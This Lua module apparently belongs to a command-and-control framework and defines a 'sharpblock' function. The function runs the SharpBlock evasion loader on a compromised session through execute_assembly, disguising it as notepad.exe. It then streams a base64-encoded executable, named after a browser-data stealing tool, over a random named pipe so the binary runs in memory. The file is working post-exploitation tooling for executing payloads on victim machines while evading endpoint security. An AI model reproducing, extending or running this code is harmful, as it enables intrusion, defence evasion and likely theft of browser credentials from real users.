local time = require("time")
require("lib.lib")
-- require("modules.noconsolation")
-- require("modules.bofnet")
local lib = {}

function lib.sharpblock(exe_path, exe_args)
    local rpc = require("rpc")
    local session = active()
    local sharpblock_file = "SharpBlock/SharpBlock_Like0x.exe"
    local randomname = random_string(16)
    local fullpipename = "\\\\.\\pipe\\" .. randomname
    local sharpblock_args = {
        "-e", fullpipename, "-s", "c:\\windows\\system32\\notepad.exe",
        "--disable-bypass-cmdline", "--disable-bypass-amsi",
        "--disable-bypass-etw", "-a", ""
    }
    if type(exe_args) == "table" then
        sharpblock_args[#sharpblock_args] = table.concat(exe_args, " ")
    elseif type(exe_args) == "string" then
        sharpblock_args[#sharpblock_args] = exe_args
    end
    print(sharpblock_args)
    print("Pipe Name" .. fullpipename)
    local task = rpc.ExecuteAssembly(session:Context(),
                                     ProtobufMessage.New(
                                         "modulepb.ExecuteBinary", {
            Name = "SharpBlock_Like0x.exe",
            Arch = 1,
            Bin = read_resource(sharpblock_file),
            Type = "execute_assembly",
            Args = sharpblock_args,
            Timeout = 600
        }))
    time.sleep(4)
    local hack_browser_data_content = read(exe_path)
    hack_browser_data_content = base64_encode(hack_browser_data_content)
    print(#hack_browser_data_content)
    pipe_upload_raw(session, fullpipename, hack_browser_data_content)
    for i = 1, 5 do
        time.sleep(0.1)
        pipe_upload_raw(session, fullpipename, "ok")
    end
end

return lib

